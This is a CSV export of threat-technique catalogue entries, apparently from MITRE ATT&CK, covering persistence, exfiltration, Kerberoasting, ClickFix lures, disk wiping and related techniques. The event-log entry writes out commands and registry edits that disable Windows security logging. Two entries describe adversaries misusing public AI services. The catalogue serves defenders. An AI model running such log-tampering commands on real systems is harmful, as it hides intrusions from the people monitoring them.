attack-pattern--d4bdbdea-eaec-4071-b4f9-5105e12ea4b6,3,T1537,Transfer Data to Cloud Account,"Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.

A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.(Citation: TLDRSec AWS Attacks)

Adversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.(Citation: Microsoft Azure Storage Shared Access Signature)

Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018)","IaaS, Office Suite, SaaS",FALSE,FALSE,2019-08-30T13:03:04Z
attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211,3,T1037.004,RC Scripts,"Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.

Adversaries may establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.

Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as ESXi hypervisors, IoT, or embedded systems.(Citation: intezer-kaiji-malware) As ESXi servers store most system files in memory and therefore discard changes on shutdown, leveraging `/etc/rc.local.d/local.sh` is one of the few mechanisms for enabling persistence across reboots.(Citation: Juniper Networks ESXi Backdoor 2022)

Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of Launchd.(Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)","macOS, Linux, Network Devices, ESXi",FALSE,FALSE,2020-01-15T16:25:22Z
attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48,3,T1134,Access Token Manipulation,"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.

An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)

Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",Windows,FALSE,FALSE,2017-12-14T16:46:06Z
attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b,3,T1543.002,Systemd Service,"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014) Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  

Systemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`).(Citation: lambert systemd 2022) 

Inside the `.service` unit files, the following directives are used to execute commands:(Citation: freedesktop systemd.service)  

* `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start.
* `ExecReload` directive executes when a service restarts. 
* `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped.  

Adversaries have created new service files, altered the commands a `.service` file’s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.(Citation: Anomali Rocke March 2019)(Citation: airwalk backdoor unix systems)(Citation: Rapid7 Service Persistence 22JUNE2016) 

The `.service` file’s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions. 

Systemd services can be created via systemd generators, which support the dynamic generation of unit files. Systemd generators are small executables that run during boot or configuration reloads to dynamically create or modify systemd unit files by converting non-native configurations into services, symlinks, or drop-ins (i.e., [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037)).(Citation: Elastic Security Labs Linux Persistence 2024)(Citation: Pepe Berba Systemd 2022)",Linux,FALSE,FALSE,2020-01-17T16:15:19Z
attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67,3,T1136,Create Account,"Adversaries may create an account to maintain access to victim systems.(Citation: Symantec WastedLocker June 2020) With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.","Windows, IaaS, Linux, macOS, Network Devices, Containers, SaaS, Office Suite, Identity Provider, ESXi",FALSE,FALSE,2017-12-14T16:46:06Z
attack-pattern--e261a979-f354-41a8-963e-6cadac27c4bf,3,T1204.004,Malicious Copy and Paste,"An adversary may rely upon a user copying and pasting code in order to gain execution. Users may be subjected to social engineering to get them to copy and paste code directly into a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). One such strategy is ""ClickFix,"" in which adversaries present users with seemingly helpful solutions—such as prompts to fix errors or complete CAPTCHAs—that instead instruct the user to copy and paste malicious code.

Malicious websites, such as those used in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), may present fake error messages or CAPTCHA prompts that instruct users to open a terminal or the Windows Run Dialog box and execute an arbitrary command. These commands may be obfuscated using encoding or other techniques to conceal malicious intent. Once executed, the adversary will typically be able to establish a foothold on the victim's machine.(Citation: CloudSEK Lumma Stealer 2024)(Citation: Sekoia ClickFake 2025)(Citation: Reliaquest CAPTCHA 2024)(Citation: AhnLab LummaC2 2025)

Adversaries may also leverage phishing emails for this purpose. When a user attempts to open an attachment, they may be presented with a fake error and offered a malicious command to paste as a solution, consistent with the ""ClickFix"" strategy.(Citation: Proofpoint ClickFix 2024)(Citation: AhnLab Malicioys Copy Paste 2024)

Tricking a user into executing a command themselves may help to bypass email filtering, browser sandboxing, or other mitigations designed to protect users against malicious downloaded files.","Linux, macOS, Windows",FALSE,FALSE,2025-03-18T12:57:50Z
attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306,3,T1098.002,Additional Email Delegate Permissions,"Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. 

For example, the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) 

Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.(Citation: Mandiant Defend UNC2452 White Paper)

This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)","Windows, Office Suite",FALSE,FALSE,2020-01-19T16:54:28Z
attack-pattern--ea4c2f9c-9df1-477c-8c42-6da1118f2ac4,3,T1027.007,Dynamic API Resolution,"Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.

API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)

To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.

Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)",Windows,FALSE,FALSE,2022-08-22T20:42:08Z
attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf,3,T1587,Develop Capabilities,"Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)

As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",PRE,FALSE,FALSE,2020-10-01T01:30:00Z
attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee,3,T1558.003,Kerberoasting,"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) 

Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)

Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)

This same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)

Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",Windows,FALSE,FALSE,2020-02-11T18:43:38Z
attack-pattern--f3d95a1f-bba2-44ce-9af7-37866cd63fd0,3,T1053.002,At,"Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the `at` command, adversaries may also schedule a task with [at](https://attack.mitre.org/software/S0110) by directly leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) `Win32_ScheduledJob` WMI class.(Citation: Malicious Life by Cybereason)

On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)

Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).

In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)","Windows, Linux, macOS",FALSE,FALSE,2019-11-27T13:52:45Z
attack-pattern--fb640c43-aa6b-431e-a961-a279010424ac,3,T1561.001,Disk Content Wipe,"Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.

Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.

To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)","Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-02-20T22:06:41Z
attack-pattern--fb75213f-cfb0-40bf-a02f-3bad93d6601e,3,T1213.005,Messaging Applications,"Adversaries may leverage chat and messaging applications, such as Microsoft Teams, Google Chat, and Slack, to mine valuable information.  

The following is a brief list of example information that may hold potential value to an adversary and may also be found on messaging applications: 

* Testing / development credentials (i.e., [Chat Messages](https://attack.mitre.org/techniques/T1552/008)) 
* Source code snippets 
* Links to network shares and other internal resources 
* Proprietary data(Citation: Guardian Grand Theft Auto Leak 2022)
* Discussions about ongoing incident response efforts(Citation: SC Magazine Ragnar Locker 2021)(Citation: Microsoft DEV-0537)

In addition to exfiltrating data from messaging applications, adversaries may leverage data from chat messages in order to improve their targeting - for example, by learning more about an environment or evading ongoing incident response efforts.(Citation: Sentinel Labs NullBulge 2024)(Citation: Permiso Scattered Spider 2023)","Office Suite, SaaS",FALSE,FALSE,2024-08-30T13:50:42Z
attack-pattern--02c5abff-30bf-4703-ab92-1f6072fae939,2,T1027.011,Fileless Storage,"Adversaries may store data in ""fileless"" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless) Shared memory directories on Linux systems (`/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock`) and volatile directories on Network Devices (`/tmp` and `/volatile`) may also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk.(Citation: Elastic Binary Executed from Shared Memory Directory)(Citation: Akami Frog4Shell 2024)(Citation: Aquasec Muhstik Malware 2024)(Citation: Bitsight 7777 Botnet)(Citation: CISCO Nexus 900 Config).

Similar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by antivirus and other endpoint security tools that can only access specific file formats from disk storage. Leveraging fileless storage may also allow adversaries to bypass the protections offered by read-only file systems in Linux.(Citation: Sysdig Fileless Malware 23022)

Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored. 

Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\System32\Wbem\Repository`) or Registry (e.g., `%SystemRoot%\System32\Config`) physical files.(Citation: Microsoft Fileless)","Linux, Windows",FALSE,FALSE,2023-03-23T19:55:25Z
attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5,2,T1006,Direct Volume Access,"Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools.(Citation: Hakobyan 2009)

Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)","Network Devices, Windows",FALSE,FALSE,2017-05-31T21:30:20Z
attack-pattern--0cc222f5-c3ff-48e6-9f52-3314baf9d37e,2,T1588.007,Artificial Intelligence,"Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks, including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043), creating basic scripts, assisting social engineering, and even developing payloads.(Citation: MSFT-AI) 

For example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598) campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587). AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)) malicious scripts and payloads.(Citation: OpenAI-CTI) Finally, AI-generated text, images, audio, and video may be used for fraud, [Impersonation](https://attack.mitre.org/techniques/T1684/001), and other malicious activities.(Citation: Google-Vishing24)(Citation: IC3-AI24)(Citation: WSJ-Vishing-AI24)
",PRE,FALSE,FALSE,2024-03-11T13:37:31Z
attack-pattern--0cf55441-b176-4332-89e7-2c4c7799d0ff,2,T1564.008,Email Hiding Rules,"Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)

Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.

Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)

In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).","Windows, Linux, macOS, Office Suite",FALSE,FALSE,2021-06-07T13:20:23Z
attack-pattern--0cfe31a7-81fc-472c-bc45-e2808d1066a3,2,T1491.002,External Defacement,"An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) may ultimately cause users to distrust the systems and to question/discredit the system’s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)","Windows, IaaS, Linux, macOS",FALSE,FALSE,2020-02-20T14:34:08Z
attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967,2,T1123,Audio Capture,"An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019)

Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:31:34Z
attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd,2,T1568.002,Domain Generation Algorithms,"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)

DGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)

Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-10T17:44:59Z
attack-pattern--11f29a39-0942-4d62-92b6-fe236cf3066e,2,T1036.007,Double File Extension,"Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) 

Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user’s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension)

Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",Windows,FALSE,FALSE,2021-08-04T20:54:03Z
attack-pattern--1411e6b8-80a6-4465-9909-54eaa9c67ce0,2,T1685.001,Disable or Modify Windows Event Log,"Adversaries may disable or modify the Windows Event Log to limit data that can be leveraged for detections and audits. Windows Event Log records user and system activity such as login attempts and process creation.(Citation: EventLog_Core_Technologies) This data is used by security tools and analysts to generate detections. 

The EventLog service maintains event logs from various system components and applications. By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to `Security Settings\Local Policies\Audit Policy` for basic audit policy settings or `Security Settings\Advanced Audit Policy Configuration` for advanced audit policy settings.(Citation: Microsoft Audit Policy)(Citation: Microsoft Adv Security Settings) `auditpol.exe` may also be used to set audit policies.(Citation: Microsoft auditpol)

Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the `Set-Service -Name EventLog -Status Stopped` or `sc config eventlog start=disabled` commands (followed by manually stopping the service using `Stop-Service -Name EventLog`). Additionally, the service may be disabled by modifying the ""Start"" value in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog` then restarting the system for the change to take effect.(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging)

There are several ways to disable the EventLog service via registry key modification. Without Administrator privileges, adversaries may modify the ""Start"" value in the key `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security`, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) With Administrator privilege, adversaries may modify the same values in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System` and `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application` to disable the entire EventLog.

Additionally, adversaries may use `auditpol` and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the `/success` or `/failure` parameters. For example, `auditpol /set /category:""Account Logon"" /success:disable /failure:disable` turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC) To clear the audit policy, adversaries may run the following lines: `auditpol /clear /y` or `auditpol /remove /allusers`.(Citation: T1562.002_redcanaryco)",Windows,FALSE,FALSE,2026-04-14T22:54:01Z
attack-pattern--143122a8-fcda-4dd7-aded-5b9387d9c2d6,2,T1682,Query Public AI Services,"Adversaries may query publicly accessible artificial intelligence (AI) services, such as large language models (LLMs), to support targeting and operations. In addition to searching websites or databases directly (i.e., [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), adversaries may use AI services to synthesize, aggregate, and analyze publicly available information at scale. This may include identifying individuals or organizations to target, researching organizational structures and personnel, identifying technologies used by target organizations, researching business relationships to develop plausible pretexts for [Social Engineering](https://attack.mitre.org/techniques/T1684) approaches, identifying contact information for use in [Phishing](https://attack.mitre.org/techniques/T1566) or [Phishing for Information](https://attack.mitre.org/techniques/T1598), or gathering derogatory or sensitive information about individuals that may be used for extortion or coercion.(Citation: MSFT-AI)(Citation: GTIG AI Threat Tracker)

Information gathered through AI services may be leveraged for other behaviors, such as establishing operational resources (i.e., [Generate Content](https://attack.mitre.org/techniques/T1683) or [Establish Accounts](https://attack.mitre.org/techniques/T1585). For obtaining access to AI tools and services, see [Artificial Intelligence](https://attack.mitre.org/techniques/T1588/007).",PRE,FALSE,FALSE,2026-03-25T14:21:30Z
